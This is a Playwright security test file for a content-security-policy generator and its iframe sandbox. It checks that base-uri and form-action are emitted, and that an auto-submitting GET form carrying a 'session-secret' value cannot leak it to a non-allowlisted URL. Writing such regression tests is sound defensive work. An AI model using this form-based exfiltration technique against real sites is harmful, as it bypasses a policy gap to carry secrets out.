import { test, expect } from '@playwright/test';
import { generateCSP } from '@src/lib/csp/csp-generator';

/**
 * Research 12: directives dropped by the empty-array rule do not all fall back to default-src.
 * Depends on backlog T1 for the e2e harness (corrected URL + allow-scripts capability).
 */

const PLAYGROUND = 'http://localhost:4444/playground/index.html';
const EXFIL = 'http://localhost:4444/playground/test-assets/local-image.svg';

test('12.1 the default policy omits base-uri and form-action, which have no fallback', () => {
    const policy = generateCSP({
        'upgrade-insecure-requests': true,
        'default-src': ["'none'"],
        'script-src': ["'self'", "'unsafe-inline'"],
        'connect-src': [], 'base-uri': [], 'img-src': [], 'style-src': ["'unsafe-inline'"],
        'font-src': [], 'media-src': [], 'manifest-src': [], 'prefetch-src': [],
        'form-action': [], 'object-src': [], 'frame-src': [], 'frame-ancestors': [],
        'worker-src': ['blob:', 'data:'],
    } as any);

    // frame-src and object-src are covered by the default-src fallback - fine that they are absent.
    // base-uri and form-action are NOT, so their absence means "unrestricted".
    // These assertions FAIL against today's generator; they encode the fix (backlog S9).
    expect(policy, 'base-uri has no default-src fallback').toContain('base-uri');
    expect(policy, 'form-action has no default-src fallback').toContain('form-action');
});

test('12.2 form-action: a GET form exfiltrates to a non-allowlisted target', async ({ page }) => {
    const reached: string[] = [];
    page.on('request', r => { if (r.url().startsWith(EXFIL)) reached.push(r.url()); });

    await page.goto(PLAYGROUND);
    await page.waitForSelector('lofi-sandbox');

    await page.evaluate((target) => {
        const s = document.querySelector('lofi-sandbox') as any;
        // allow-forms is a sanctioned value in ALLOWED_CAPABILITIES
        s.setConfig({ capabilities: ['allow-scripts', 'allow-forms'] });
        s.load(`<html><head><title>t</title></head><body>
            <form id="f" action="${target}" method="GET">
              <input name="stolen" value="session-secret">
            </form>
            <script>document.getElementById('f').submit();</script>
        </body></html>`);
    }, EXFIL);

    await page.waitForTimeout(3000);

    // FAILS against today's code: the submission carries the value out in the query string.
    expect(reached, 'form submission escaped the network policy').toHaveLength(0);
});
